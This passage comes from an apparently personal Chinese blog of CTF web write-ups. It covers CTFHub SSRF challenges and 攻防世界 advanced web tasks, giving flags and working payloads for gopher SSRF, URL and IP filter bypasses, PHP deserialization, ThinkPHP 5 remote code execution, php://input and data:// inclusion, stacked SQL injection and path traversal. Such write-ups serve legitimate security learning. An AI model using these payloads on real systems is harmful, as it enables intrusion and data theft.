<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] !&#x3D; &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag&#x3D;getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key &#x3D; md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] &#x3D;&#x3D; $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;flag.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
<p>即要求将key提交给flag.php，同时只能由本地提交，也就是SSRF</p>
<p>利用gopher，发送构造好的报文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flag.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key&#x3D;a2a7e6cc66515b8a94be07946050ed51</span><br></pre></td></tr></table></figure>
<p>其中要3次URL编码，其中换行符%0A要替换成%0d%0A</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?url&#x3D;127.0.0.1&#x2F;302.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Da2a7e6cc66515b8a94be07946050ed51	</span><br></pre></td></tr></table></figure>
<p>没出答案，方法应该没问题，跳过</p>
<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5c384f5f92d64f244c7362b7&#125;</span><br></pre></td></tr></table></figure>
<h3 id="URL-跳转bypass"><a href="#URL-跳转bypass" class="headerlink" title="URL 跳转bypass"></a>URL 跳转bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.利用问好绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com?www.xxxx.me</span><br><span class="line">2.利用@绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com@www.xxxx.me</span><br><span class="line">3.利用斜杠反斜杠绕过限制</span><br><span class="line">4.利用#绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com#www.xxxx.me</span><br><span class="line">5.利用子域名绕过</span><br><span class="line">6.利用畸形url绕过</span><br><span class="line">7.利用跳转ip绕过</span><br></pre></td></tr></table></figure>
<h2 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;localhost&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>正解是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;IP:PORT&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>但是环境貌似有问题，直接访问?url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E5%8D%B3%E5%8F%AF">http://127.0.0.1/flag.php即可</a></p>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h2><p>用途：查看目标端口指纹信息</p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;serverip:port</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;ip:port&#x2F;info</span><br></pre></td></tr></table></figure>
<p>可获取目标主机的port端口上运行着的应用</p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h2><p>用途：发送各种格式的请求包</p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;ip:port&#x2F;gopher-path</span><br><span class="line">注意，gopher-path部分，回车换行符要进行2次URL编码</span><br></pre></td></tr></table></figure>
<p>示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.163.150&#x2F;test.php?url&#x3D;gopher:&#x2F;&#x2F;192.168.163.1:80&#x2F;_POST%20&#x2F;evil.php%20HTTP&#x2F;1.1%250d%250aHost:%20192.168.163.1%250d%250aUser-Agent:%20curl&#x2F;7.43.0%250d%250aAccept:%20*&#x2F;*%250d%250aContent-Type:%20application&#x2F;x-www-form-urlencoded%250d%250a%250d%250acmd&#x3D;balabala</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/20/CTF-Web-SSRF/" data-id="ckloj8nvk0000vcusd50p9nro" data-title="CTF-Web-SSRF" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-攻防世界web高级" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/" class="article-date">
  <time class="dt-published" datetime="2021-02-20T00:29:40.000Z" itemprop="datePublished">2021-02-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/">CTF-wp-攻防世界web高级</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>工具：firefox</p>
<p>看一下返回的响应头，就看到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;very_baby_web&#125;</span><br></pre></td></tr></table></figure>
<p>Training-WWW-Robots</p>
<p>打开网页，根据提示在url输入/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
<p>在url输入/fl0g.php，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;04a3b25a4981849593d0b45e6f3b2717&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h1><p>根据网页上显示的源码，需要在url的var中传入一个参数，这个参数首先会被base64解码，然后查看是否pre_match一个正则，最后被序列化</p>
<p>因此，需要把Demo中的file变量设置成“fl4g.php”，并且需要依次进行序列化，pre_match的绕过，base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private $file &#x3D; &#39;index.php&#39;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file &#x3D; $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123; </span><br><span class="line">            &#x2F;&#x2F;the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A &#x3D; new Demo(&#39;fl4g.php&#39;);</span><br><span class="line">    $C &#x3D; serialize($A);</span><br><span class="line">    &#x2F;&#x2F;string(49) &quot;O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">    $C &#x3D; str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$C);&#x2F;&#x2F;绕过preg_match</span><br><span class="line">    $C &#x3D; str_replace(&#39;:1:&#39;, &#39;:2:&#39;,$C);&#x2F;&#x2F;绕过wakeup</span><br><span class="line">    var_dump($C);</span><br><span class="line">    &#x2F;&#x2F;string(49) &quot;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">    var_dump(base64_encode($C));</span><br><span class="line">    &#x2F;&#x2F;string(68) &quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag&#x3D;&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span><br></pre></td></tr></table></figure>


<h2 id="php的var-dump"><a href="#php的var-dump" class="headerlink" title="php的var_dump"></a>php的var_dump</h2><p>输出变量信息</p>
<h2 id="php的class"><a href="#php的class" class="headerlink" title="php的class"></a>php的class</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__construct：初始化一个对象时执行</span><br><span class="line">__destruct：对象销毁时执行</span><br><span class="line">__wakeup：对象被反序列化时执行</span><br></pre></td></tr></table></figure>
<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php rce"></a>php rce</h1><p>打开网页，先试试ThinkPHP V5的框架。在github上查找ThinkPHP V5的漏洞，存在以下语句可以获得shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
<p>依次执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls</span><br><span class="line">favicon.ico index.php robots.txt router.php static static</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;find &#x2F; -name &quot;flag&quot;</span><br><span class="line">&#x2F;flag &#x2F;flag</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;file &#x2F;flag</span><br><span class="line">&#x2F;flag: ASCII text &#x2F;flag: ASCII text</span><br><span class="line"></span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag</span><br><span class="line">flag&#123;thinkphp5_rce&#125; flag&#123;thinkphp5_rce&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>php据题目提示，将提供的字符串按base64解码得到答案</p>
<h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><p>考察：base64编码</p>
<p>根据题目提示，将提供的字符串按base64解码得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;Welcome_to_new_World!&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>考察：php://input或data://</p>
<p><strong>方法1：大小写绕过or双写绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45427&#x2F;?hello&#x3D;echo &#96;ls&#96;&amp;page&#x3D;pHp:&#x2F;&#x2F;input</span><br><span class="line">Post data: &lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到当前目录下有一个flag</p>
<p><strong>方法2：data://伪协议</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45427&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>方法3：一句话木马+菜刀</strong></p>
<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><p>通过php访问输入输出流，后可接stdin,stdout,stderr。常用input和output代替，在post data部分传入php代码</p>
<h2 id="data-伪数据协议"><a href="#data-伪数据协议" class="headerlink" title="data://伪数据协议"></a>data://伪数据协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,&lt;?base64编码后的php代码?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php代码?&gt;</span><br></pre></td></tr></table></figure>


<h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h1><p>考察：堆叠注入，sql预编译</p>
<p>使用sqlmap失败，只能手工注入。</p>
<p>尝试后发现是单引号注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>使用union select，提示过滤了select等关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>使用原生sql函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;;show databases; --+</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;; show tables; --+</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;1&#39;;</span><br></pre></td></tr></table></figure>
<p>使用sql变量和预编译技巧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;-&#39;;set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<p>提示使用函数绕过了prepare，此处用大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:55503&#x2F;?inject&#x3D;-&#39;;set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<h2 id="sql的预编译"><a href="#sql的预编译" class="headerlink" title="sql的预编译"></a>sql的预编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义sql语句，如此定义可以绕过对select的过滤</span><br><span class="line">set @sql&#x3D;CONCAT(&#39;Se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;)</span><br><span class="line">&#x2F;&#x2F; 定义预编译语句</span><br><span class="line">PREPARE stm FROM @sql;</span><br><span class="line">&#x2F;&#x2F; 执行预编译语句</span><br><span class="line">EXECUTE stm;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义带变量的预编译语句</span><br><span class="line">PREPARE stm FROM &#39;SELECT (?+?)&#39;</span><br><span class="line">&#x2F;&#x2F; 执行带变量的预编译语句</span><br><span class="line">EXECUTE stm USING @a, @b;</span><br></pre></td></tr></table></figure>
<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>打开页面，发现只能进入到一个页面中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:53522&#x2F;index.php?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>id处进行暴力枚举，得到2333为有响应的网页</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:53522&#x2F;index.php?id&#x3D;2333</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;967266c008c6e2bb3563346fef63b664&#125;</span><br></pre></td></tr></table></figure>


<h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>进入页面，只有一个滑稽。</p>
<p>查看源码，提示访问source.php，访问后得到一个php代码，该题为代码审计</p>
<p>以下为涉及到的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(&amp;str, start, length) 返回[start,start+length]部分的str字符串</span><br><span class="line">in_array(&amp;t1, &amp;t2) 判断t1是否在数组t2中</span><br></pre></td></tr></table></figure>
<p>代码的主要功能在checkFile函数中，判断传入的参数file是否在whitelist中，若在则返回true，并include该file。由此可知，这是一个文件包含漏洞，绕过checkFile中的部分返回true即可</p>
<p>whilltelist中出了source.php，还有一个hint.php。</p>
<p>访问hint.php，提示flag在ffffllllaaaagggg中，目标文件尾ffffllllaaaagggg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:54846&#x2F;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br><span class="line"># 目标文件在哪是多次测试得到的</span><br></pre></td></tr></table></figure>
<p>别人的wp提示，hint.php后的?会在上传时url解码，但是直接提交也过了2333</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</span><br></pre></td></tr></table></figure>


<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><p>本题有个输入框</p>
<p>猜测为命令漏洞，失败</p>
<p>根据wp为sql注入</p>
<h2 id="sqlmap方法"><a href="#sqlmap方法" class="headerlink" title="sqlmap方法"></a>sqlmap方法</h2><p>抓包发现为post提交，因此需要将包存在在本地后，使用post发送发送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt --dbs 用1.txt内容去搜索对应的所有数据库名</span><br><span class="line">sqlmap.py -r 1.txt -D news --dump 建立可后台news库连接， 搜索所有的数据</span><br></pre></td></tr></table></figure>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>wp有手工注入方法，但是给我的环境莫名其妙试不了，加单引号就报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;sq1_inJec7ion_ezzz&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sqlmap的–dump选项"><a href="#sqlmap的–dump选项" class="headerlink" title="sqlmap的–dump选项"></a>sqlmap的–dump选项</h2><p>可以查询指定范围的全部数据</p>
<h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>下载附件，解压后得到一个文件，观察发现是混杂了普通字符和十六进制字符的html代码。</p>
<p>尝试手工替换，失败。</p>
<p>添加html后缀后，用浏览器打开，得到一个输入框，但是仍然不能得到解码后的js代码。</p>
<p>观察js源码，发现开头将_设置成了了整个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; _&#x3D;&#39;function</span><br></pre></td></tr></table></figure>
<p>而结尾使用eval函数执行。那么将eval改成alert，即可得到完整的js代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function $()&#123;</span><br><span class="line">	var e&#x3D;document.getElementById(&quot;c&quot;).value;</span><br><span class="line">	if(e.length&#x3D;&#x3D;16)</span><br><span class="line">		if(e.match(&#x2F;^be0f23&#x2F;)!&#x3D;null)</span><br><span class="line">			if(e.match(&#x2F;233ac&#x2F;)!&#x3D;null)</span><br><span class="line">				if(e.match(&#x2F;e98aa$&#x2F;)!&#x3D;null)</span><br><span class="line">					if(e.match(&#x2F;c7be9&#x2F;)!&#x3D;null)&#123;</span><br><span class="line">						var t&#x3D;[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">						var n&#x3D;[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">						var r&#x3D;[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">						var i&#x3D;[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">						var s&#x3D;[t,n,r,i];</span><br><span class="line">						for(var o&#x3D;0;o&lt;13;++o)&#123;</span><br><span class="line">							document.write(s[o%4][0]);</span><br><span class="line">							s[o%4].splice(0,1)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">							</span><br><span class="line">					document.write(&#39;&lt;input id&#x3D;&quot;c&quot;&gt;&lt;button onclick&#x3D;$()&gt;Ok&lt;&#x2F;button&gt;&#39;);delete _</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>可以通过在输入框输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beof233ac7be98aa</span><br></pre></td></tr></table></figure>
<p>得到flag，也可以通过审计代码直接获得flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;it&#39;s_a_h0le_in_0ne&#125;</span><br></pre></td></tr></table></figure>


<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>按照顺序一步步倒推操作</p>
<p>原密文</p>
